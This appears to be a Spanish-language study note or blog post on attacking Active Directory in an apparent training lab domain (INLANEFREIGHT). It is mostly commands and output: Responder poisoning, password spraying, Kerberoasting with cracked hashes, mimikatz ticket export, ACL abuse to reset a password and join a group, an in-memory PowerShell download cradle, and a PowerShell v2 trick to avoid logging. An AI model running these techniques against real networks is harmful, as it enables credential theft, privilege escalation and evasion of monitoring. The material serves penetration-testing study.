---
title: Active Directory
date: 2022-08-12 13:25:30 +/-TTTT
categories: [UTILITIES]
tags: []     # TAG names should always be lowercase
---
Primero se empíeza con la etapa de de reconocimiento pasivo usando herramientas como `nslookup` y registros públicos del dominio o ip que se nos asigne. Igualmente mediante `kerbrute` podmeos
obtener usuarios válidos, esta se considera una manera sigilosa de hacer reconocmiento activo, podemos usar `responder` para ver registros y obtener un dominio o información útil en la
interfaz de la máquina atacada.

```shell
sudo responder -i ens224
sudo tcpdump -i ens224
```
## Envenenamiento LLMNR/NBT-NS - desde Linux

Con responder podemos hacer un `M̀an in the middle` para poder obtener un hash LLMNR o NBT-NS e intentar crackearlo, 

```shell
ls /usr/share/responder/logs/
Analyzer-Session.log  Config-Responder.log  Poisoners-Session.log  Responder-Session.log  SMB-NTLMv2-SSP-172.16.5.130.txt

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt 

clusteragent::INLANEFREIGHT:b5af06265941cd68:FF1CEDC4CD71040CB1A475DE7CDE9366:010100000000000000268C57B3E0D801DB1E7B1D53A0417D0000000002000800540046003500530001001E00570049004E002D004C0033004C0
05900350047005700370056004900540004003400570049004E002D004C0033004C00590035004700570037005600490054002E0054004600350053002E004C004F00430041004C000300140054004600350053002E004C004F00430041004C000500
140054004600350053002E004C004F00430041004C000700080000268C57B3E0D801060004000200000008003000300000000000000000000000003000007916A53455926B8EDB268D83802A5B83252E6A0886B3ACA4E0D39AE3BA912D170A001
000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

hashcat -a 0 -m 5600 hash3 /usr/share/Seclists/rockyou.txt
```

Una herramienta similar a responder pero a para windows seria `inveigh`, podemos importarlo mediante un módulo de powershell o directamente ejecutarlo en su versión compilada aunque esta ya no esté
actualizada.

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## Enumeración de usuarios

Mediante herramientas como `rpclient`, `smbclient`, `kerbrute` etc. podemos intentar conseguir información de usuario.

```shell
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
```
También podemos obtener la política de la contraseña mediante `rpclient` para disminuir la lista de contrasñeas a intentar.

```shell
getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```
Otra herramienta útil puede ser `enum4linux`, con esta podemos importar los resultado en formato JSON o YAML. Esta herramienta hace un reconomiento básico de los diferentes servicios
existentes.

```shell
enum4linux-ng -P 172.16.5.5 -oA ilfreight

ENUM4LINUX - next generation

<SNIP>

 =======================================
|    RPC Session Check on 172.16.5.5    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE
```
Con un enlace anónimo de LDAP, podemos usar herramientas de enumeración específicas de LDAP, como `windapseach.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., para extraer la política de contraseñas. 
Con ldapsearch , puede ser un poco engorroso pero factible. 

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```
Aquí podemos ver la longitud mínima de la contraseña de 8, el umbral de bloqueo de 5 y la complejidad de la contraseña establecida (pwdProperties stablecida en 1).

En windows podemos obtener esta política mediante `net.exe` o `powerview`

```powershell
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```
Si estamos dentro de un entorno windows podemos hacer uso de `DomainPasswordSpray.ps1`

```powershell
PS C:\tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2940 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2940 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2940 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Winter2022 against 2940 users. Current time is 5:11 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:dbranch Password:Winter2022
```
## BloodHound, Snaffler

Con estas dos herramientas podemos hacer un barrido de lo que tenemos en la máquina víctima, con la intención de buscar formas de elevar privilegios.

```powershell
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
```

```powershell
Import-Module ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Con esto podemos abrir bloodhound e importar el zip para obtener la información del dominio.

## Basic Enumeration

Cuando no se tiene acceso a herramientas o a la internet, es necesario usar reconomiento con herramientas ya establecidas en cmd o powershell

### Env Commands For Host & Network 

|hostname|	Prints the PC's Name|
|[System.Environment]::OSVersion.Version|	Prints out the OS version and revision level||
|wmic qfe get Caption,Description,HotFixID,InstalledOn|	Prints the patches and hotfixes applied to the host|
|ipconfig /all|	Prints out network adapter state and configurations|
|set %USERDOMAIN%|	Displays the domain name to which the host belongs (ran from CMD-prompt)|
|set %logonserver%|	Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

POWERSHELL

|Cmd-Let|	Descripción|
|:-------:|------------------:|
|Get-Module|	Enumera los módulos disponibles cargados para su uso.|
|Get-ExecutionPolicy -List|	Imprimirá la configuración de la política de ejecución para cada ámbito en un host.|
|Set-ExecutionPolicy Bypass -Scope Process|	Esto cambiará la política de nuestro proceso actual usando el -Scopeparámetro. Si lo hace, revertirá la política una vez que anulemos el proceso o lo finalicemos. Esto es ideal porque no realizaremos un cambio permanente en el host de la víctima.|
|Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt|	Con esta cadena, podemos obtener el historial de PowerShell del usuario especificado. Esto puede ser muy útil ya que el historial de comandos puede contener contraseñas o indicarnos archivos de configuración o secuencias de comandos que contienen contraseñas.|
|Get-ChildItem Env: | ft Key,Value|	Devuelve valores de entorno como rutas clave, usuarios, información de la computadora, etc.|
|powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"|	Esta es una manera rápida y fácil de descargar un archivo de la web usando PowerShell y llamarlo desde la memoria.|

Una manera de no dejar logs mediante powershell es inciando la versión 2 de este mismo. 

```powershell
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
```
## Defense enumeration

```powershell
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable
```
```cmd
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
Con este comando podremos ver que otros usuarios están logaedos

```powershell
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```
### Network Information

|arp -a|	Enumera todos los hosts conocidos almacenados en la tabla arp.|
|ipconfig /all|	Imprime la configuración del adaptador para el host. Podemos averiguar el segmento de red desde aquí.|
|route print|	Muestra la tabla de enrutamiento (IPv4 e IPv6) que identifica redes conocidas y rutas de capa tres compartidas con el host.|
|netsh advfirewall show state|	Muestra el estado del cortafuegos del host. Podemos determinar si está activo y filtrando tráfico.|

arp y route print nos ayudará a encontrar nuevas ip donde podamos pivotear.

Con dsquery podemos obtener información valiosa de usuarios, dominio, hosts, etc.

```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

## Kerberoasting attack

Este ataque nos permite hacernos pasar por un usuario del dominio para conseguir los Service Principal Names (SPN) y poder intentar conseguir el hash NTLM de algún servicio del dominio para después poder usar el servicio
con privilegios elevados o reutilizar la contraseña para otro usuario o servicio. Para este ataque se utiliza la herramienta `GetUserSPNs` si estamos atacando desde una máquina linux.

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```
Una vez teniendo los SPN podemos usar `-request` para obtener todos los hashes de los servicios o en todo caso poner el nombre del servicio al que queremos obtener el hash.

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>               



$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762.....
```

Con hashcat podemos crackear la contraseña con el modo `13100`

```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022
```

Si tenemos solo un entorno windows para ejecutar un kerberoasting attack, podemos usar `mimikatz`, `powerview`, `setspn.exe`

```cmd
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local
```
Una vez teniendo el nombre de usuario en powershell podemos cargar el TGS ticket a la memoria para después con `mimikatz` extraer el hash y poder crackearlo.

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Una combinación de estos para cargar todos los tickets disponibles es

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Después con mimikatz extraemos los hashes

```cmd
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
```

### Powerview

Con powerview es más sencillo obtener estos hashes

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177
                       AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769F
                       DC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0
                       12E1938AEC0E02229F4C707D333BD3F33642172A204054F1D7045AF3303809A3178DD7F3D8C4FB0FBB0BB412F3BD5526
```

O para obtener todos los tickets en un solo archivo podemos hacer:

```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

### Rubeus

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg

```

Se usa el tgtdeleg para que nos proporcione un hash RC4 que es más fácil de crackear que un AES 128/256


## ACL 

Los permisos ACL nos permiten tener una persistencia al momento de vulnerar un sistema, o para movernos laterlamente por este mismo. Estos permisos se componen de visualización de archivos, 
listado de directorios, etc. Tenemos herramientas como poweview o bloodhound que podemos usar para enumerar todos estos privilegios, primero veremos cómo hacerle con powerview.

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley

```
Con este método nos va a dar mucha información que puede ser dificil de encontrar lo que buscamos por lo que con con powerview podemos ahorrar tiempo. Convirtiendo nuestro usuario en SID

```powershell
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
```
Podríamos buscar en Google el valor GUID 00299570-246d-11d0-a768-00aa006e0529 para ver de que permiso y se trata de `User-Force-Change-Password`, podríamos usar -ResolveBUIDs para brincarnos el paso
de estar buscando.

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
En este ejemplo podemos ver que  tiene GenericWrite sobre Help Desk 1, que nos permite poder agregar a un usuario o a nosotros mismos a este grupo para obtener los privilegios.

```powershell
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```
En un principio no pareciera útil, pero intentemos buscar si el grupo está ligado a otro.

```powershell
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```
O con bloodhound podemos ir viendo los permisos que tienen los usuarios.

Al tener en cuenta los ACL que tenemos disponibles de ese usuario, podemos ir explotando la vulnerabilidad, en este ejemplo usaré el usuario `wley` para ir elevando privilegios con permisos
`ForceChangePassword`

```powershell
PS C:\tools> $pass = ConvertTo-SecureString "transporter@4" -AsPlainText -Force
PS C:\tools> Set-DomainUserPassword -Identity INLANEFREIGHT.LOCAL/damundsen -AccountPassword $pass2 -Credential $cred -verbose
PS C:\tools> Set-DomainUserPassword -Identity damundsen -AccountPassword $pass2 -Credential $cred -verbose
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```
De esta manera ya cambiamos la contraseña del usuario `damundsen`, después vemos que el usuario damundsen está en el grupo `Help Desk Level 1`

```powershell
C:\tools> Get-DomainObjectACL -Identity "Help Desk Level 1" | ? {$_.SecurityIdentifier -eq "S-1-5-21-3842939050-3880317879-2865463114-1176"}


ObjectDN              : CN=Help Desk Level 1,OU=Security
                        Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 131132
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```
Vemos que el usuario tiene permisos GenericWrite sobre el grupo. Para validar que esté dentro usamos esto:

```powershell
Get-ADgroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty member
```
Y en caso de que el usuario no esté dentro del grupo podremos usar 

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```
El grupo Help Desk Level 1 es miembro del grupo `Information Technology` que este grupo tiene permisos `GenericAll` sobre el usuario `adunn` que esto permite tener pemisos completos al objeto.

```powershell
Get-DomainObjectACL -Identity adunn | ? {$_.SecurityIdentifier -eq $sid}


ObjectDN              : CN=Angela Dunn,OU=Server
                        Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
